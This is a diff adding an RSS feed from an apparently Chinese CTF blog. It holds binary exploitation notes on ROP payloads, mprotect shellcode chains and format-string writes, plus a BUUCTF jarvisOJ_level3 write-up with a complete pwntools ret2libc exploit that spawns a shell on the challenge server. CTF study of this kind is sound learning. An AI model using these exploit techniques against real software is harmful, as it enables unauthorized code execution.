@@ -1,0 +1,153 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Blog • Posts by &#34;pwn&#34; tag</title>
+        <link>http://example.com</link>
+        <description></description>
+        <language>zh-CN</language>
+        <pubDate>Mon, 04 Sep 2023 19:33:55 +0800</pubDate>
+        <lastBuildDate>Mon, 04 Sep 2023 19:33:55 +0800</lastBuildDate>
+        <category>pwn</category>
+        <category>二进制</category>
+        <category>ctf</category>
+        <item>
+            <guid isPermalink="true">http://example.com/2023/09/04/PWN%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/</guid>
+            <title>buuctf.pwn</title>
+            <link>http://example.com/2023/09/04/PWN%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/</link>
+            <category>pwn</category>
+            <category>二进制</category>
+            <pubDate>Mon, 04 Sep 2023 19:33:55 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;#&amp;lt;center&amp;gt;PWN 零碎知识 &amp;lt;/center&amp;gt;&lt;br /&gt;
+###1.64 位程序与 32 位程序 payload​&lt;br /&gt;
+64 位程序 payload 要先用 pop_rdi 覆盖 ret 然后依次是 调用函数的参数，调用函数本身，最后是返回地址（32 位程序传参不需要用寄存器）&lt;br /&gt;
+32 位程序是调用函数先函数本身，然后是函数返回地址，再是参数&lt;br /&gt;
+ payload=b&amp;quot;\x00&amp;quot;*(0x50+8)+p64 (rdi_ret)+p64 (put_got)+p64 (put_plt)+p64 (0x4009A0)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;先是垃圾字符，然后pop_rdi,接着put_got是利用执行put_plt泄露的地址，最后是返回地址
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;###2. 注意栈对齐（Ubuntu18 以上格外注意）&lt;/p&gt;
+&lt;p&gt;###3 泄露的函数接收时，需要看其最后返回地址的函数是否有输出字符串，如有则先接收返回地址输出的字符串&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;payload=b&amp;quot;\x00&amp;quot;*(0x50+8)+p64(rdi_ret)+p64(put_got)+p64(put_plt)+p64(返回地址)
+p.sendlineafter(&amp;quot;Input your Plaintext to be encrypted\n&amp;quot;,payload)
+
+p.recvline()  #返回地址中输出的字符串
+p.recvline()  #返回地址中输出的字符串
+puts=u64(p.recvuntil(b&#39;\n&#39;)[:-1].ljust(8,b&#39;\0&#39;))
+
+puts=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;###4. 有时接收不能用 u64 (p.recv ()), 会出错，利用 u64 (p.recvuntil (b&#39;\n&#39;)[:-1].ljust (8,b&#39;\0&#39;))&lt;/p&gt;
+&lt;p&gt;###5 遇到要绕过 strlen 函数要绕过时用 b&amp;quot;\x00&amp;quot; 截断&lt;/p&gt;
+&lt;p&gt;###6. 系统调用是调用 execve (&amp;quot;/bin/sh&amp;quot;,NULL,NULL)【平常调用为 system (&amp;quot;/bin/sh&amp;quot;)】&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;32位程序系统调用号用 eax 储存, 第一 、 二 、 三参数分别在 ebx 、ecx 、edx中储存。 可以用 int 80 汇编指令调用
+
+当eax=11时即为系统调用号调用命令execve，参数&amp;quot;/bin/sh&amp;quot;赋给ebx
+
+64位程序系统调用号用 rax 储存, 第一 、 二 、 三参数分别在 rdi 、rsi 、rdx中储存。 可以用 syscall 汇编指令调用
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;###7. 有 mprotect 函数可以改变内存的读写权限&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mprotect(起始地址，修改内存长度，修改的权限（修改为7） )
+
+指定的内存区间必须包含整个内存页(4k)，起始地址必须是页的起始地址(末尾为00?),修改区间的长度必须是页的整数倍
+
+mem_addr (起始地址)= 0x80EB000   mem_size(内存长度) = 0x1000   mem_proc(权限) = 0x7 【32位程序时也可以找任意三个寄存器来传参(如pop ebx;pop exi;pop ebp;ret)，为了控制后续的返回地址】
+
+在可以利用执行shellcode时可以用，修改一个位置可执行，然后调用read存入shellcode加以执行
+
+payload=b&amp;quot;a&amp;quot;*0x2d
+
+payload+=p32(mprotect)+p32(pop_ret)+p32(plt_got)+p32(0x100)+p32(0x7)
+
+此处没有覆盖ebp，因为查看汇编ebp还未入栈，所以直接覆盖ret，后面的为调用3个寄存器
+
+payload+=p32(read)+p32(pop_ret)+p32(0)+p32(plt_got)+p32(0x100)+p32(plt_got)
+
+返回地址为read，
+
+此处调用顺序为 执行函数，寄存器_返回地址，参数，函数返回地址(32位程序下，与一般32位不同，一般不调用寄存器)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;###8.shellcode 编写&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;用pwntools生成：
+
+shellcode = asm(shellcraft.sh())
+
+shellcode网址（用的时候不知道为什么不行）：
+
+[https://www.exploit-db.com/](https://www.exploit-db.com/ &amp;quot;漏洞利用数据库 - 渗透测试人员、研究人员和道德黑客的漏洞利用 (exploit-db.com)&amp;quot;)
+
+[http://shell-storm.org/shellcode/index.html](http://shell-storm.org/shellcode/index.html &amp;quot;Shellcodes database for study cases (shell-storm.org)&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;###9.strcmp () 绕过&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/fc1eb2d3cb7a463e8599114af5c2da07.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;#####str1=str2 时返回 0，一般用这个绕过&lt;/p&gt;
+&lt;p&gt;###10.switch () 语句&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;switch(表达式)&amp;#123; 
+    case 常量表达式1:  语句1;
+    case 常量表达式2:  语句2;
+    … 
+    case 常量表达式n:  语句n;
+    default:  语句n+1;
+
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;##### 将表达式的结果与常量表达式依次比较直到相同&lt;/p&gt;
+&lt;p&gt;#####11. 栈溢出注意输入的 payload 是不是再栈上，有时不是输入在栈上，后面可能会调用 strcpy ()，此时可能会将输入的 payload 复制到栈上，需要按照复制后的栈填充垃圾字符等等&lt;/p&gt;
+&lt;p&gt;###12. 整数溢出漏洞（比大小绕过判断），&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;无符号整型 unsigned int 遇到 -1 时会将 -1转化为该无符号整型的最大值
+
+unsigned int ( -1 )=max unsigned int
+
+int (-1)= -1
+
+输入无符号整型时应该输入字符串（”-1“），不能是（b”-1“）
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;###13. 格式化字符串漏洞（不仅仅用来泄露 canary，还可以改变地址内的值）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;payload=pwnme地址（32位是4字节）+b&amp;quot;a&amp;quot;*4+b&amp;quot;%10$n&amp;quot;
+
+有printf(buf)会将输入的payload存入buf偏移为10的地方(该偏移需要利用aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p查看)，并且将%10$前面的八字节大小视作8存入该地址
+
+http://t.csdn.cn/1sJDx
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;###14.echo flag 【system(&amp;quot;echo flag&amp;quot;)】&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;输出字符串，后面跟什么就输出什么，这里输出&amp;quot;flag&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;###15.val=atoi(str)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;将str转为整数型字符串，当第一个字符不能识别为数字时，函数将停止读入输入字符串
+
+str=&amp;quot;987654&amp;quot; ,val=(int)987654
+
+str=&amp;quot;abc&amp;quot; ,      val=0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;###16. (char*)malloc(x*sizeof(char))&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;分配x字节连续的空间，从堆空间中分配，返回值为分配空间的首地址
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;​&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2023/09/04/buuctf-pwn/</guid>
+            <title>buuctf.pwn</title>
+            <link>http://example.com/2023/09/04/buuctf-pwn/</link>
+            <category>pwn</category>
+            <category>二进制</category>
+            <category>ctf</category>
+            <pubDate>Mon, 04 Sep 2023 19:33:55 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;#buuctf&lt;br /&gt;
+##[HarekazeCTF2019]baby_rop2&lt;/p&gt;
+&lt;p&gt;##pwn2_sctf_2016&lt;br /&gt;
+&lt;img data-src=&#34;kerd.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;##&amp;lt;center&amp;gt;&lt;strong&gt;31.&lt;strong&gt;jarvisOJ_level3(&lt;strong&gt;ret2libc&lt;/strong&gt;)&amp;lt;/center&amp;gt;&lt;br /&gt;
+####1. 下载源文后查看文件保护和位数&lt;br /&gt;
+&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/06/pPsjif1.md.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+ ####2. 发现是 32 位程序，开启了 NX (栈不可执行)&lt;br /&gt;
+####，利用 ida 反编译查看程序 C 语言代码&lt;br /&gt;
+&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/06/pPsjPYR.md.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+ #### 发现有 vul 函数进入查看&lt;br /&gt;
+&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/06/pPsjCk9.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+ ####3. 发现有 write 和 read 函数，其中 read 函数可以进行栈溢出，可以对此利用 	注意:write (1, 输出地址，输出字节数)&lt;br /&gt;
+ 因为没有发现后门函数，所以利用&lt;/strong&gt; write 泄露 libc 的地址来执行 system (/bin/sh)&lt;/strong&gt;&lt;br /&gt;
+###exp:&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher3 &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log_level &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node4.buuoj.cn&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;28074&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./level3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	write_plt&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;plt&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	read_got&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;got&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	main&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;symbols&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;main&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Input:\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	payload1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x88&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;write_plt&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;read_got&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;#p.recvuntil(&#34;Input:\n&#34;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	read&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	libc&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;LibcSearcher&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	libcbase&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;read&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	system&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;libcbase&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;system&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	binsh&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;libcbase&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;str_bin_sh&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Input:\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	payload2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x88&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;system&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;binsh&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;#### 此题无法用 libcsearcher 远程库找到 libc&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
